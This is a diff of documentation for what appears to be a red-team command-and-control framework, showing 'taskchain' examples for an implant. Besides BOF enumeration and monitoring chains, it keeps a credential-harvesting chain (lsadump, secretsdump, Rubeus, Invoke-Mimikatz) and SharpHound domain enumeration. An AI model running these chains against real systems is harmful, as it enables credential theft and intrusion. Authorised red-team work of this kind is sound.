@@ -216,35 +216,16 @@ taskchain create AGENT001 clear_logs,kill_processes,cleanup_files name=cleanup
 
 ## Example Workflows
 
-### 1. Automated Penetration Test
-```bash
-# Create an automated penetration test sequence (legacy format)
-taskchain create AGENT001 sysinfo,whoami,priv_enum,get_system,whoami,pslist name=auto_pen_test execute=true
-
-# Enhanced format for more complex operations
-taskchain create AGENT001 execute-bof=whoami.o,priv_enum.o,get_system,whoami,pslist name=enhanced_pen_test execute=true
-```
-
-### 2. Beacon Object File Execution (BOFs)
+### 1. Beacon Object File Execution (BOFs)
 ```bash
 # Execute multiple BOF files in sequence
-taskchain create AGENT001 execute-bof=whoami.x64.o,tasklist.x64.o,seatbelt.x64.o,pwsh=Get-ComputerName.ps1,execute-assembly=rubeus.exe name=bof_chain
+taskchain create AGENT001 execute-bof=whoami.x64.o,tasklist.x64.o,seatbelt.x64.o name=bof_chain
 
 # Multi-step enumeration with BOFs
 taskchain create AGENT001 execute-bof=netview.x64.o,netsession.x64.o,execute-assembly=SharpHound.exe name=enum_chain
 ```
 
-### 3. Incident Response
-```bash
-# Quick incident response data collection
-taskchain create AGENT001 processes,network_connections,log_analysis,file_hashes name=incident_response
-taskchain execute CHAIN1234567890
-
-# Enhanced incident response with file collection
-taskchain create AGENT001 execute-bof=netstat.o,pslist.o,pwsh=Get-EventLogs.ps1,execute-assembly=Seatbelt.exe name=enhanced_incident_response
-```
-
-### 4. Persistent Monitoring
+### 2. Persistent Monitoring
 ```bash
 # Regular monitoring chain
 taskchain create AGENT001 sysinfo,service_check,process_monitor name=persistent_monitoring
@@ -253,7 +234,7 @@ taskchain create AGENT001 sysinfo,service_check,process_monitor name=persistent_
 taskchain create AGENT001 execute-bof=service_enum.o,process_check.o,execute-assembly=SharpHound.exe name=enhanced_monitoring
 ```
 
-### 5. Post-Exploitation
+### 3. Post-Exploitation
 ```bash
 # Credential harvesting chain
 taskchain create AGENT001 execute-bof=lsadump.o,secretsdump.o,execute-assembly=Rubeus.exe,pwsh=Invoke-Mimikatz.ps1 name=credential_harvest
